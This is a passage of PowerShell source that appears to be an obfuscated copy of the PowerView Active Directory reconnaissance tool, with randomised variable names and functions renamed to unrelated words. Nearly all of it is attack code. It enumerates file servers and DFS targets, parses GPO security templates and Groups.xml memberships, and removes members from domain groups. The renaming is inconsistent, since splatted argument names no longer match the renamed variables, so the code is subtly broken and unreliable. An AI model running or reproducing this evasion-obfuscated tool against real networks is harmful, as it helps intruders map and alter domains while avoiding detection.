        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VmQxvGKA99 = @{
            'Identity' = $feaYcbZI99
        }
        if ($PSBoundParameters['Domain']) { $VmQxvGKA99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Credential']) { $VmQxvGKA99['Credential'] = $fjBNCklg99 }
        $KXpFcMcO99 = Timur @ContextArguments
        if ($KXpFcMcO99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($KXpFcMcO99.Context, $KXpFcMcO99.Identity)
            }
            catch {
                Write-Warning "[Diogenes] Error finding the group identity '$feaYcbZI99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($AJyGNBNz99 in $VztYncUI99) {
                if ($AJyGNBNz99 -match '.+\\.+') {
                    $VmQxvGKA99['Identity'] = $AJyGNBNz99
                    $TpSLkOnC99 = Timur @ContextArguments
                    if ($TpSLkOnC99) {
                        $Ymfcwbqe99 = $TpSLkOnC99.Identity
                    }
                }
                else {
                    $TpSLkOnC99 = $KXpFcMcO99
                    $Ymfcwbqe99 = $AJyGNBNz99
                }
                Write-Verbose "[Diogenes] Removing member '$AJyGNBNz99' from group '$feaYcbZI99'"
                $AJyGNBNz99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($TpSLkOnC99.Context, $Ymfcwbqe99)
                $Group.Members.Remove($AJyGNBNz99)
                $Group.Save()
            }
        }
    }
}
function elucidate {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function informants {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $XVFWmInN99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($TDntIjFc99 in $jnYnRnFJ99) {
                $XVFWmInN99['Domain'] = $TDntIjFc99
                $RAYXFvvv99 = maroons @SearcherArguments
                $(ForEach($PBCxjsiW99 in $RAYXFvvv99.FindAll()) {if ($PBCxjsiW99.Properties['homedirectory']) {informants($PBCxjsiW99.Properties['homedirectory'])}if ($PBCxjsiW99.Properties['scriptpath']) {informants($PBCxjsiW99.Properties['scriptpath'])}if ($PBCxjsiW99.Properties['profilepath']) {informants($PBCxjsiW99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $RAYXFvvv99 = maroons @SearcherArguments
            $(ForEach($PBCxjsiW99 in $RAYXFvvv99.FindAll()) {if ($PBCxjsiW99.Properties['homedirectory']) {informants($PBCxjsiW99.Properties['homedirectory'])}if ($PBCxjsiW99.Properties['scriptpath']) {informants($PBCxjsiW99.Properties['scriptpath'])}if ($PBCxjsiW99.Properties['profilepath']) {informants($PBCxjsiW99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}
function venous {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $AyfxOJQV99 = 'All'
    )
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        function Yuletides {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )
            $bin = $Pkt
            $jQgMJvAR99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $NSAPyBnT99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $TlmuwuKV99 = 8
            $OCJqbgMi99 = @()
            for($i=1; $i -le $NSAPyBnT99; $i++){
                $lddatzUK99 = $TlmuwuKV99
                $KQqTsTgP99 = $TlmuwuKV99 + 1
                $oxrSGylW99 = [bitconverter]::ToUInt16($bin[$lddatzUK99..$KQqTsTgP99],0)
                $qXwpAAtN99 = $KQqTsTgP99 + 1
                $OlkOlbDb99 = $qXwpAAtN99 + $oxrSGylW99 - 1
                $hBAmfmQY99 = [System.Text.Encoding]::Unicode.GetString($bin[$qXwpAAtN99..$OlkOlbDb99])
                $fEGAaWmQ99 = $OlkOlbDb99 + 1
                $MPWZIzSk99 = $fEGAaWmQ99 + 3
                $cvbWltgI99 = [bitconverter]::ToUInt32($bin[$fEGAaWmQ99..$MPWZIzSk99],0)
                $INRmQLzx99 = $MPWZIzSk99 + 1
                $EKBwCrOf99 = $INRmQLzx99 + $cvbWltgI99 - 1
                $USrluDhH99 = $bin[$INRmQLzx99..$EKBwCrOf99]
                switch -wildcard ($hBAmfmQY99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $ZOOmVwED99 = 0
                        $RfUVhryG99 = 15
                        $rynOxIxU99 = [byte[]]$USrluDhH99[$ZOOmVwED99..$RfUVhryG99]
                        $guid = New-Object Guid(,$rynOxIxU99) # should match $dyqKomSU99
                        $WOXSGTDs99 = $RfUVhryG99 + 1
                        $EUforeXj99 = $WOXSGTDs99 + 1
                        $YXlisvVm99 = [bitconverter]::ToUInt16($USrluDhH99[$WOXSGTDs99..$EUforeXj99],0)
                        $sHZmiWNY99 = $EUforeXj99 + 1
                        $GkcHgzJD99 = $sHZmiWNY99 + $YXlisvVm99 - 1
                        $NEtBqtPP99 = [System.Text.Encoding]::Unicode.GetString($USrluDhH99[$sHZmiWNY99..$GkcHgzJD99])
                        $dOpjHbfw99 = $GkcHgzJD99 + 1
                        $FPLElECm99 = $dOpjHbfw99 + 1
                        $KcmsBbZx99 = [bitconverter]::ToUInt16($USrluDhH99[$dOpjHbfw99..$FPLElECm99],0)
                        $YtvkPYze99 = $FPLElECm99 + 1
                        $IzqbIyeJ99 = $YtvkPYze99 + $KcmsBbZx99 - 1
                        $YidTvnUg99 = [System.Text.Encoding]::Unicode.GetString($USrluDhH99[$YtvkPYze99..$IzqbIyeJ99])
                        $YgWygXhu99 = $IzqbIyeJ99 + 1
                        $RnQTlFXx99 = $YgWygXhu99 + 3
                        $type = [bitconverter]::ToUInt32($USrluDhH99[$YgWygXhu99..$RnQTlFXx99],0)
                        $OffUeHKp99 = $RnQTlFXx99 + 1
                        $ULfjUkuD99 = $OffUeHKp99 + 3
                        $state = [bitconverter]::ToUInt32($USrluDhH99[$OffUeHKp99..$ULfjUkuD99],0)
                        $bamzupvF99 = $ULfjUkuD99 + 1
                        $LkNtZstq99 = $bamzupvF99 + 1
                        $mljSXQXQ99 = [bitconverter]::ToUInt16($USrluDhH99[$bamzupvF99..$LkNtZstq99],0)
                        $BFlCJFnn99 = $LkNtZstq99 + 1
                        $osepatKJ99 = $BFlCJFnn99 + $mljSXQXQ99 - 1
                        if ($mljSXQXQ99 -gt 0)  {
                            $GFmhzEqU99 = [System.Text.Encoding]::Unicode.GetString($USrluDhH99[$BFlCJFnn99..$osepatKJ99])
                        }
                        $RorYOiwC99 = $osepatKJ99 + 1
                        $jZYCZqsw99 = $RorYOiwC99 + 7
                        $ExxcsbnH99 = $USrluDhH99[$RorYOiwC99..$jZYCZqsw99] #dword lowDateTime #dword highdatetime
                        $vDRKLQqx99 = $jZYCZqsw99 + 1
                        $lYWOtvAo99 = $vDRKLQqx99 + 7
                        $yqtWCpft99 = $USrluDhH99[$vDRKLQqx99..$lYWOtvAo99]
                        $bxfzMUct99 = $lYWOtvAo99 + 1
                        $ZqzoBFcz99 = $bxfzMUct99 + 7
                        $zKmuXtFH99 = $USrluDhH99[$bxfzMUct99..$ZqzoBFcz99]
                        $FklNwSCc99 = $ZqzoBFcz99  + 1
                        $MYyFNoyk99 = $FklNwSCc99 + 3
                        $AyfxOJQV99 = [bitconverter]::ToUInt32($USrluDhH99[$FklNwSCc99..$MYyFNoyk99],0)
                        $IBAptxkJ99 = $MYyFNoyk99 + 1
                        $knyRlaDF99 = $IBAptxkJ99 + 3
                        $xzhwHyFB99 = [bitconverter]::ToUInt32($USrluDhH99[$IBAptxkJ99..$knyRlaDF99],0)
                        $AGXHGvvD99 = $knyRlaDF99 + 1
                        $CIgjHpJP99 = $AGXHGvvD99 + $xzhwHyFB99 - 1
                        $hpnICBuo99 = $USrluDhH99[$AGXHGvvD99..$CIgjHpJP99]
                        $NoToqXKu99 = $CIgjHpJP99 + 1
                        $ohbenBRJ99 = $NoToqXKu99 + 3
                        $DHGfnmcu99 = [bitconverter]::ToUInt32($USrluDhH99[$NoToqXKu99..$ohbenBRJ99],0)
                        $LWguQBhP99 = $ohbenBRJ99 + 1
                        $wnYOcEJo99 = $LWguQBhP99 + $DHGfnmcu99 - 1
                        $SioyCDGa99 = $USrluDhH99[$LWguQBhP99..$wnYOcEJo99]
                        $FYTPVUby99 = $wnYOcEJo99 + 1
                        $XQxYalIU99 = $FYTPVUby99 + 3
                        $iMJOowce99 = [bitconverter]::ToUInt32($USrluDhH99[$FYTPVUby99..$XQxYalIU99],0)
                        $dMtVaaSc99 = 0
                        $ECftPLxF99 = $dMtVaaSc99 + 3
                        $KLiFfJQl99 = [bitconverter]::ToUInt32($hpnICBuo99[$dMtVaaSc99..$ECftPLxF99],0)
                        $CjvgXkxJ99 = $ECftPLxF99 + 1
                        for($j=1; $j -le $KLiFfJQl99; $j++){
                            $fSRMHhwr99 = $CjvgXkxJ99
                            $QMfdaXMl99 = $fSRMHhwr99 + 3
                            $SCSgDJGe99 = [bitconverter]::ToUInt32($hpnICBuo99[$fSRMHhwr99..$QMfdaXMl99],0)
                            $PnRuNysY99 = $QMfdaXMl99 + 1
                            $xIpYxXPO99 = $PnRuNysY99 + 7
                            $uefiLBwy99 = $hpnICBuo99[$PnRuNysY99..$xIpYxXPO99]
                            $fbdBKcgz99 = $xIpYxXPO99 + 1
                            $OxCvsfKi99 = $fbdBKcgz99 + 3
                            $yuGwVSPE99 = [bitconverter]::ToUInt32($hpnICBuo99[$fbdBKcgz99..$OxCvsfKi99],0)
                            $fcGleNXS99 = $OxCvsfKi99 + 1
                            $OAmhSMau99 = $fcGleNXS99 + 3
                            $VaIyFBVa99 = [bitconverter]::ToUInt32($hpnICBuo99[$fcGleNXS99..$OAmhSMau99],0)
                            $bSkeGBeL99 = $OAmhSMau99 + 1
                            $ywwUXpXu99 = $bSkeGBeL99 + 1
                            $wsLYtuHM99 = [bitconverter]::ToUInt16($hpnICBuo99[$bSkeGBeL99..$ywwUXpXu99],0)
                            $ervLylCP99 = $ywwUXpXu99 + 1
                            $gMplGgqO99 = $ervLylCP99 + $wsLYtuHM99 - 1
                            $URXssJTN99 = [System.Text.Encoding]::Unicode.GetString($hpnICBuo99[$ervLylCP99..$gMplGgqO99])
                            $LxSyYZdn99 = $gMplGgqO99 + 1
                            $OVpyyVST99 = $LxSyYZdn99 + 1
                            $EsFsKbhe99 = [bitconverter]::ToUInt16($hpnICBuo99[$LxSyYZdn99..$OVpyyVST99],0)
                            $AdMnWXJT99 = $OVpyyVST99 + 1
                            $FGsaSEOG99 = $AdMnWXJT99 + $EsFsKbhe99 - 1
                            $GGwShAXZ99 = [System.Text.Encoding]::Unicode.GetString($hpnICBuo99[$AdMnWXJT99..$FGsaSEOG99])
                            $hqdrquuK99 += "\\$URXssJTN99\$GGwShAXZ99"
                            $CjvgXkxJ99 = $FGsaSEOG99 + 1
                        }
                    }
                }
                $TlmuwuKV99 = $EKBwCrOf99 + 1
                $sUsGSKEG99 = @{
                    'Name' = $hBAmfmQY99
                    'Prefix' = $NEtBqtPP99
                    'TargetList' = $hqdrquuK99
                }
                $OCJqbgMi99 += New-Object -TypeName PSObject -Property $sUsGSKEG99
                $NEtBqtPP99 = $Null
                $hBAmfmQY99 = $Null
                $hqdrquuK99 = $Null
            }
            $zuwbaruH99 = @()
            $OCJqbgMi99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $zuwbaruH99 += $_.split('\')[2]
                    }
                }
            }
            $zuwbaruH99
        }
        function disseminate {
            [CmdletBinding()]
            Param(
                [String]
                $jnYnRnFJ99,
                [String]
                $WdOnSHnL99,
                [String]
                $qgdPgdMB99,
                [String]
                $TRVzBsDk99 = 'Subtree',
                [Int]
                $CgYkCByk99 = 200,
                [Int]
                $elDiVqTz99,
                [Switch]
                $rmzHuzlC99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
            )
            $kpPtDNEo99 = maroons @PSBoundParameters
            if ($kpPtDNEo99) {
                $slsbTdSa99 = @()
                $kpPtDNEo99.filter = '(&(objectClass=fTDfs))'
                try {
                    $CmGXBhUd99 = $kpPtDNEo99.FindAll()
                    $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                        $ycQOyvWh99 = $_.Properties
                        $KyIgOTqx99 = $ycQOyvWh99.remoteservername
                        $Pkt = $ycQOyvWh99.pkt
                        $slsbTdSa99 += $KyIgOTqx99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$ycQOyvWh99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[venous] disseminate error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($CmGXBhUd99) {
                        try { $CmGXBhUd99.dispose() }
                        catch {
                            Write-Verbose "[venous] disseminate error disposing of the Results object: $_"
                        }
                    }
                    $kpPtDNEo99.dispose()
                    if ($pkt -and $pkt[0]) {
                        Yuletides $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$ycQOyvWh99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[venous] disseminate error : $_"
                }
                $slsbTdSa99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
        function evangelizing {
            [CmdletBinding()]
            Param(
                [String]
                $jnYnRnFJ99,
                [String]
                $WdOnSHnL99,
                [String]
                $qgdPgdMB99,
                [String]
                $TRVzBsDk99 = 'Subtree',
                [Int]
                $CgYkCByk99 = 200,
                [Int]
                $elDiVqTz99,
                [Switch]
                $rmzHuzlC99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
            )
            $kpPtDNEo99 = maroons @PSBoundParameters
            if ($kpPtDNEo99) {
                $slsbTdSa99 = @()
                $kpPtDNEo99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $kpPtDNEo99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                try {
                    $CmGXBhUd99 = $kpPtDNEo99.FindAll()
                    $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                        $ycQOyvWh99 = $_.Properties
                        $hqdrquuK99 = $ycQOyvWh99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($hqdrquuK99[2..($hqdrquuK99.Length-1)])
                        $slsbTdSa99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $LUTdAEhP99 = $_.InnerText
                                if ( $LUTdAEhP99.Contains('\') ) {
                                    $uYlRMiIU99 = $LUTdAEhP99.split('\')[3]
                                    $fSwxgNDj99 = $ycQOyvWh99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$uYlRMiIU99$fSwxgNDj99";'RemoteServerName'=$LUTdAEhP99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[venous] evangelizing error in parsing target : $_"
                            }
                        }
                    }
                    if ($CmGXBhUd99) {
                        try { $CmGXBhUd99.dispose() }
                        catch {
                            Write-Verbose "[venous] Error disposing of the Results object: $_"
                        }
                    }
                    $kpPtDNEo99.dispose()
                }
                catch {
                    Write-Warning "[venous] evangelizing error : $_"
                }
                $slsbTdSa99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }
    PROCESS {
        $slsbTdSa99 = @()
        if ($PSBoundParameters['Domain']) {
            ForEach ($TDntIjFc99 in $jnYnRnFJ99) {
                $XVFWmInN99['Domain'] = $TDntIjFc99
                if ($AyfxOJQV99 -match 'all|1') {
                    $slsbTdSa99 += disseminate @SearcherArguments
                }
                if ($AyfxOJQV99 -match 'all|2') {
                    $slsbTdSa99 += evangelizing @SearcherArguments
                }
            }
        }
        else {
            if ($AyfxOJQV99 -match 'all|1') {
                $slsbTdSa99 += disseminate @SearcherArguments
            }
            if ($AyfxOJQV99 -match 'all|2') {
                $slsbTdSa99 += evangelizing @SearcherArguments
            }
        }
        $slsbTdSa99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}
function Chesterfield {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $XDtbSiRX99,
        [Switch]
        $IjANvzFD99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $jPZxaEEm99 = @{}
    }
    PROCESS {
        try {
            if (($XDtbSiRX99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $dSAdrsLS99 = "\\$((New-Object System.Uri($XDtbSiRX99)).Host)\SYSVOL"
                if (-not $jPZxaEEm99[$dSAdrsLS99]) {
                    decaf -Path $dSAdrsLS99 -fjBNCklg99 $fjBNCklg99
                    $jPZxaEEm99[$dSAdrsLS99] = $True
                }
            }
            $eQYDHMbQ99 = $XDtbSiRX99
            if (-not $eQYDHMbQ99.EndsWith('.inf')) {
                $eQYDHMbQ99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }
            Write-Verbose "[Chesterfield] Parsing GptTmplPath: $eQYDHMbQ99"
            if ($PSBoundParameters['OutputObject']) {
                $gApAQZdY99 = hoarded -Path $eQYDHMbQ99 -IjANvzFD99 -ErrorAction Stop
                if ($gApAQZdY99) {
                    $gApAQZdY99 | Add-Member Noteproperty 'Path' $eQYDHMbQ99
                    $gApAQZdY99
                }
            }
            else {
                $gApAQZdY99 = hoarded -Path $eQYDHMbQ99 -ErrorAction Stop
                if ($gApAQZdY99) {
                    $gApAQZdY99['Path'] = $eQYDHMbQ99
                    $gApAQZdY99
                }
            }
        }
        catch {
            Write-Verbose "[Chesterfield] Error parsing $eQYDHMbQ99 : $_"
        }
    }
    END {
        $jPZxaEEm99.Keys | ForEach-Object { bonehead -Path $_ }
    }
}
function abstraction {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $lEsAjRqp99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $jPZxaEEm99 = @{}
    }
    PROCESS {
        try {
            if (($lEsAjRqp99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $dSAdrsLS99 = "\\$((New-Object System.Uri($lEsAjRqp99)).Host)\SYSVOL"
                if (-not $jPZxaEEm99[$dSAdrsLS99]) {
                    decaf -Path $dSAdrsLS99 -fjBNCklg99 $fjBNCklg99
                    $jPZxaEEm99[$dSAdrsLS99] = $True
                }
            }
            [XML]$gfaQEiCi99 = Get-Content -Path $lEsAjRqp99 -ErrorAction Stop
            $gfaQEiCi99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
                $EidYTRyh99 = $_.Properties.groupName
                $PzXOJiqw99 = $_.Properties.groupSid
                if (-not $PzXOJiqw99) {
                    if ($EidYTRyh99 -match 'Administrators') {
                        $PzXOJiqw99 = 'S-1-5-32-544'
                    }
                    elseif ($EidYTRyh99 -match 'Remote Desktop') {
                        $PzXOJiqw99 = 'S-1-5-32-555'
                    }
                    elseif ($EidYTRyh99 -match 'Guests') {
                        $PzXOJiqw99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $PzXOJiqw99 = theoretic -GwxiGtHr99 $EidYTRyh99 -fjBNCklg99 $fjBNCklg99
                        }
                        else {
                            $PzXOJiqw99 = theoretic -GwxiGtHr99 $EidYTRyh99
                        }
                    }
                }
                $VztYncUI99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($VztYncUI99) {
                    if ($_.filters) {
                        $UqlDhBTe99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $UqlDhBTe99 = $Null
                    }
                    if ($VztYncUI99 -isnot [System.Array]) { $VztYncUI99 = @($VztYncUI99) }
                    $LxjYBPXL99 = New-Object PSObject
                    $LxjYBPXL99 | Add-Member Noteproperty 'GPOPath' $BQmExMTN99
                    $LxjYBPXL99 | Add-Member Noteproperty 'Filters' $UqlDhBTe99
                    $LxjYBPXL99 | Add-Member Noteproperty 'GroupName' $EidYTRyh99
                    $LxjYBPXL99 | Add-Member Noteproperty 'GroupSID' $PzXOJiqw99
                    $LxjYBPXL99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $LxjYBPXL99 | Add-Member Noteproperty 'GroupMembers' $VztYncUI99
                    $LxjYBPXL99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $LxjYBPXL99
                }
            }
        }
        catch {
            Write-Verbose "[abstraction] Error parsing $BQmExMTN99 : $_"
        }
    }
    END {
        $jPZxaEEm99.Keys | ForEach-Object { bonehead -Path $_ }
    }
}
function bridals {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $feaYcbZI99,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $vlwKkvTg99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Ymfcwbqe99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $CbdswDUU99 = maroons @SearcherArguments
    }
    PROCESS {
        if ($CbdswDUU99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $qOUgKbli99 = @()
                if ($XVFWmInN99['Properties']) {
                    $pOrzlwhD99 = $XVFWmInN99['Properties']
                }
                $XVFWmInN99['Properties'] = 'distinguishedname,dnshostname'
                $KcsUhItY99 = $Null
                if ($PSBoundParameters['ComputerIdentity']) {
                    $XVFWmInN99['Identity'] = $vlwKkvTg99
                    $GocAGaEB99 = cowing @SearcherArguments -cIwTZAKh99 | Select-Object -First 1
                    if(-not $GocAGaEB99) {
                        Write-Verbose "[bridals] Computer '$vlwKkvTg99' not found!"
                    }
                    $GXfnLfMX99 = $GocAGaEB99.distinguishedname
                    $KcsUhItY99 = $GocAGaEB99.dnshostname
                }
                else {
                    $XVFWmInN99['Identity'] = $Ymfcwbqe99
                    $User = suit @SearcherArguments -cIwTZAKh99 | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[bridals] User '$Ymfcwbqe99' not found!"
                    }
                    $GXfnLfMX99 = $User.distinguishedname
                }
